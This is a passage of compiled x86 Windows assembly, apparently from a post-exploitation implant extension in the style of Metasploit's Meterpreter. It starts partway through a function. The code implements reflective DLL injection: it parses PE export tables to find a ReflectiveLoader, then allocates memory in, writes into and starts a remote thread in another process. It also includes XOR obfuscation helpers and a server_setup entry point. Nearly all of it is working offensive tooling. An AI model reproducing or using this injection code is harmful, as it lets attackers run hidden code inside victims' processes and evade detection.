	cmpl	%eax, 8(%ebp)
	jnb	L95
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	12(%eax), %eax
	movl	8(%ebp), %edx
	movl	%edx, %ecx
	subl	%eax, %ecx
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	20(%eax), %eax
	addl	%ecx, %eax
	jmp	L88
L95:
	movzwl	-2(%ebp), %eax
	addl	$1, %eax
	movw	%ax, -2(%ebp)
L94:
	movl	-12(%ebp), %eax
	movzwl	6(%eax), %eax
	cmpw	%ax, -2(%ebp)
	jb	L96
L92:
	movl	$0, %eax
L88:
	leave
	ret
	.globl	_GetReflectiveLoaderOffset
	.def	_GetReflectiveLoaderOffset;	.scl	2;	.type	32;	.endef
_GetReflectiveLoaderOffset:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	$0, -28(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -12(%ebp)
	movl	$0, -36(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -24(%ebp)
	movl	8(%ebp), %eax
	movl	%eax, -28(%ebp)
	movl	-28(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -32(%ebp)
	movl	-32(%ebp), %eax
	movzwl	24(%eax), %eax
	cmpw	$267, %ax
	jne	L98
	movl	$0, -24(%ebp)
	movl	-32(%ebp), %eax
	addl	$120, %eax
	movl	%eax, -12(%ebp)
	jmp	L99
L98:
	movl	-32(%ebp), %eax
	movzwl	24(%eax), %eax
	cmpw	$523, %ax
	jne	L100
	movl	$1, -24(%ebp)
	movl	-32(%ebp), %eax
	addl	$136, %eax
	movl	%eax, -12(%ebp)
	jmp	L99
L100:
	movl	$0, %eax
	jmp	L101
L99:
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	movl	-28(%ebp), %edx
	addl	%edx, %eax
	movl	%eax, -32(%ebp)
	movl	-32(%ebp), %eax
	movl	32(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	movl	-28(%ebp), %edx
	addl	%edx, %eax
	movl	%eax, -12(%ebp)
	movl	-32(%ebp), %eax
	movl	28(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	movl	-28(%ebp), %edx
	addl	%edx, %eax
	movl	%eax, -36(%ebp)
	movl	-32(%ebp), %eax
	movl	36(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	movl	-28(%ebp), %edx
	addl	%edx, %eax
	movl	%eax, -16(%ebp)
	movl	12(%ebp), %eax
	shrl	$16, %eax
	testl	%eax, %eax
	jne	L102
	movl	12(%ebp), %eax
	movzwl	%ax, %edx
	movl	-32(%ebp), %eax
	movl	16(%eax), %eax
	subl	%eax, %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%eax, -36(%ebp)
	movl	-36(%ebp), %eax
	movl	(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	jmp	L101
L102:
	movl	-32(%ebp), %eax
	movl	24(%eax), %eax
	movl	%eax, -20(%ebp)
	jmp	L103
L105:
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	movl	-28(%ebp), %edx
	addl	%edx, %eax
	movl	%eax, -40(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	call	_strstr
	testl	%eax, %eax
	je	L104
	movl	-32(%ebp), %eax
	movl	28(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	movl	-28(%ebp), %edx
	addl	%edx, %eax
	movl	%eax, -36(%ebp)
	movl	-16(%ebp), %eax
	movzwl	(%eax), %eax
	movzwl	%ax, %eax
	sall	$2, %eax
	addl	%eax, -36(%ebp)
	movl	-36(%ebp), %eax
	movl	(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	jmp	L101
L104:
	addl	$4, -12(%ebp)
	addl	$2, -16(%ebp)
L103:
	movl	-20(%ebp), %eax
	leal	-1(%eax), %edx
	movl	%edx, -20(%ebp)
	testl	%eax, %eax
	jne	L105
	movl	$0, %eax
L101:
	leave
	ret
	.globl	_LoadLibraryR@12
	.def	_LoadLibraryR@12;	.scl	2;	.type	32;	.endef
_LoadLibraryR@12:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	$0, -24(%ebp)
	movl	$0, -12(%ebp)
	movl	$0, -28(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -20(%ebp)
	cmpl	$0, 8(%ebp)
	je	L107
	cmpl	$0, 12(%ebp)
	jne	L108
L107:
	movl	$0, %eax
	jmp	L112
L108:
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_GetReflectiveLoaderOffset
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	je	L110
	movl	8(%ebp), %edx
	movl	-12(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -16(%ebp)
	leal	-28(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	$64, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualProtect@16, %eax
	call	*%eax
	subl	$16, %esp
	testl	%eax, %eax
	je	L110
	movl	-16(%ebp), %eax
	call	*%eax
	movl	%eax, -20(%ebp)
	cmpl	$0, -20(%ebp)
	je	L111
	leal	-24(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$6, 4(%esp)
	movl	$0, (%esp)
	movl	-20(%ebp), %eax
	call	*%eax
	subl	$12, %esp
	testl	%eax, %eax
	jne	L111
	movl	$0, -24(%ebp)
L111:
	movl	-28(%ebp), %eax
	leal	-32(%ebp), %edx
	movl	%edx, 12(%esp)
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualProtect@16, %eax
	call	*%eax
	subl	$16, %esp
L110:
	movl	-24(%ebp), %eax
L112:
	leave
	ret	$12
	.globl	_LoadRemoteLibraryR@20
	.def	_LoadRemoteLibraryR@20;	.scl	2;	.type	32;	.endef
_LoadRemoteLibraryR@20:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$72, %esp
	movl	$0, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -12(%ebp)
	movl	$0, -24(%ebp)
	movl	$0, -28(%ebp)
	cmpl	$0, 8(%ebp)
	je	L120
	cmpl	$0, 12(%ebp)
	je	L120
	cmpl	$0, 16(%ebp)
	je	L120
	movl	20(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_GetReflectiveLoaderOffset
	movl	%eax, -24(%ebp)
	cmpl	$0, -24(%ebp)
	je	L121
	movl	$4, 16(%esp)
	movl	$12288, 12(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualAllocEx@20, %eax
	call	*%eax
	subl	$20, %esp
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	je	L122
	movl	$0, 16(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__WriteProcessMemory@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	je	L123
	movl	$0, 16(%esp)
	movl	$32, 12(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualProtectEx@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	je	L124
	movl	-16(%ebp), %edx
	movl	-24(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -20(%ebp)
	leal	-28(%ebp), %eax
	movl	%eax, 24(%esp)
	movl	$0, 20(%esp)
	movl	24(%ebp), %eax
	movl	%eax, 16(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	$1048576, 8(%esp)
	movl	$0, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__CreateRemoteThread@28, %eax
	call	*%eax
	subl	$28, %esp
	movl	%eax, -12(%ebp)
	jmp	L120
L121:
	nop
	jmp	L120
L122:
	nop
	jmp	L120
L123:
	nop
	jmp	L120
L124:
	nop
L120:
	movl	-12(%ebp), %eax
	leave
	ret	$20
	.globl	_Init
	.def	_Init;	.scl	2;	.type	32;	.endef
_Init:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	_hAppInstance, %eax
	testl	%eax, %eax
	jne	L126
	movl	$0, (%esp)
	movl	__imp__GetModuleHandleA@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, _hAppInstance
L126:
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_server_setup
	movl	%eax, -12(%ebp)
	movl	8(%ebp), %eax
	movl	8(%eax), %eax
	cmpl	$-365818114, %eax
	je	L127
	cmpl	$-365818114, %eax
	ja	L133
	cmpl	$170532320, %eax
	je	L129
	cmpl	$1453503984, %eax
	je	L130
	jmp	L133
L127:
	movl	$0, (%esp)
	movl	__imp__SetUnhandledExceptionFilter@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L131
L129:
	movl	$0, (%esp)
	movl	__imp__ExitThread@4, %eax
	call	*%eax
L130:
	movl	$0, (%esp)
	movl	__imp__ExitProcess@4, %eax
	call	*%eax
L133:
	nop
L131:
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_DllMain@12
	.def	_DllMain@12;	.scl	2;	.type	32;	.endef
_DllMain@12:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$1, -12(%ebp)
	cmpl	$6, 12(%ebp)
	ja	L135
	movl	12(%ebp), %eax
	sall	$2, %eax
	addl	$L137, %eax
	movl	(%eax), %eax
	jmp	*%eax
	.section .rdata,"dr"
	.align 4
L137:
	.long	L135
	.long	L140
	.long	L135
	.long	L135
	.long	L138
	.long	L135
	.long	L136
	.text
L138:
	movl	16(%ebp), %eax
	movl	%eax, (%esp)
	call	_Init
	movl	%eax, -12(%ebp)
	jmp	L135
L136:
	cmpl	$0, 16(%ebp)
	je	L143
	movl	_hAppInstance, %edx
	movl	16(%ebp), %eax
	movl	%edx, (%eax)
	jmp	L143
L140:
	movl	8(%ebp), %eax
	movl	%eax, _hAppInstance
	jmp	L135
L143:
	nop
L135:
	movl	-12(%ebp), %eax
	leave
	ret	$12
	.def	___udivdi3;	.scl	2;	.type	32;	.endef
	.globl	_current_unix_timestamp
	.def	_current_unix_timestamp;	.scl	2;	.type	32;	.endef
_current_unix_timestamp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	leal	-24(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GetSystemTime@4, %eax
	call	*%eax
	subl	$4, %esp
	leal	-32(%ebp), %eax
	movl	%eax, 4(%esp)
	leal	-24(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__SystemTimeToFileTime@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	-32(%ebp), %eax
	movl	%eax, -40(%ebp)
	movl	-28(%ebp), %eax
	movl	%eax, -36(%ebp)
	movl	-40(%ebp), %eax
	movl	-36(%ebp), %edx
	addl	$717324288, %eax
	adcl	$-27111903, %edx
	movl	$10000000, 8(%esp)
	movl	$0, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	___udivdi3
	leave
	ret
	.globl	_sleep
	.def	_sleep;	.scl	2;	.type	32;	.endef
_sleep:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	jmp	L147
L148:
	movl	$-296, (%esp)
	movl	__imp__Sleep@4, %eax
	call	*%eax
	subl	$4, %esp
	subl	$4294967, 8(%ebp)
L147:
	cmpl	$4294967, 8(%ebp)
	ja	L148
	movl	8(%ebp), %eax
	imull	$1000, %eax, %eax
	movl	%eax, (%esp)
	movl	__imp__Sleep@4, %eax
	call	*%eax
	subl	$4, %esp
	nop
	leave
	ret
	.globl	_xor_bytes
	.def	_xor_bytes;	.scl	2;	.type	32;	.endef
_xor_bytes:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%ebx
	subl	$16, %esp
	movl	$0, -8(%ebp)
	jmp	L150
L151:
	movl	12(%ebp), %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movzbl	(%eax), %ebx
	movl	-8(%ebp), %eax
	andl	$3, %eax
	movl	%eax, %edx
	movl	8(%ebp), %eax
	addl	%edx, %eax
	movzbl	(%eax), %ecx
	movl	12(%ebp), %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	xorl	%ecx, %ebx
	movl	%ebx, %edx
	movb	%dl, (%eax)
	addl	$1, -8(%ebp)
L150:
	movl	-8(%ebp), %eax
	cmpl	16(%ebp), %eax
	jb	L151
	nop
	nop
	addl	$16, %esp
	popl	%ebx
	popl	%ebp
	ret
	.globl	_rand_xor_key
	.def	_rand_xor_key;	.scl	2;	.type	32;	.endef
_rand_xor_key:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	_initialised.83408, %eax
	testl	%eax, %eax
	jne	L153
	movl	$0, (%esp)
	call	_time
	movl	%eax, (%esp)
	call	_srand
	movl	$1, _initialised.83408
L153:
	call	_rand
	movl	%eax, %ecx
	movl	$-2130574327, %edx
	movl	%ecx, %eax
	imull	%edx
	leal	(%edx,%ecx), %eax
	sarl	$7, %eax
	movl	%eax, %edx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	imull	$254, %eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %eax
	leal	1(%eax), %edx
	movl	8(%ebp), %eax
	movb	%dl, (%eax)
	call	_rand
	movl	%eax, %ecx
	movl	$-2130574327, %edx
	movl	%ecx, %eax
	imull	%edx
	leal	(%edx,%ecx), %eax
	sarl	$7, %eax
	movl	%eax, %edx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	imull	$254, %eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %eax
	movl	%eax, %edx
	movl	8(%ebp), %eax
	addl	$1, %eax
	addl	$1, %edx
	movb	%dl, (%eax)
	call	_rand
	movl	%eax, %ecx
	movl	$-2130574327, %edx
	movl	%ecx, %eax
	imull	%edx
	leal	(%edx,%ecx), %eax
	sarl	$7, %eax
	movl	%eax, %edx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	imull	$254, %eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %eax
	movl	%eax, %edx
	movl	8(%ebp), %eax
	addl	$2, %eax
	addl	$1, %edx
	movb	%dl, (%eax)
	call	_rand
	movl	%eax, %ecx
	movl	$-2130574327, %edx
	movl	%ecx, %eax
	imull	%edx
	leal	(%edx,%ecx), %eax
	sarl	$7, %eax
	movl	%eax, %edx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	imull	$254, %eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %eax
	movl	%eax, %edx
	movl	8(%ebp), %eax
	addl	$3, %eax
	addl	$1, %edx
	movb	%dl, (%eax)
	nop
	leave
	ret
	.section .rdata,"dr"
LC0:
	.ascii "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
	.text
	.globl	_is_null_guid
	.def	_is_null_guid;	.scl	2;	.type	32;	.endef
_is_null_guid:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	$16, 8(%esp)
	movl	$LC0, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_memcmp
	testl	%eax, %eax
	sete	%al
	movzbl	%al, %eax
	leave
	ret
.lcomm _initialised.83408,4,4
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_strcmp;	.scl	2;	.type	32;	.endef
	.def	_strstr;	.scl	2;	.type	32;	.endef
	.def	_server_setup;	.scl	2;	.type	32;	.endef
	.def	_srand;	.scl	2;	.type	32;	.endef
	.def	_rand;	.scl	2;	.type	32;	.endef
	.def	_memcmp;	.scl	2;	.type	32;	.endef
	.section .drectve
	.ascii " -export:\"ReflectiveLoader@0\""
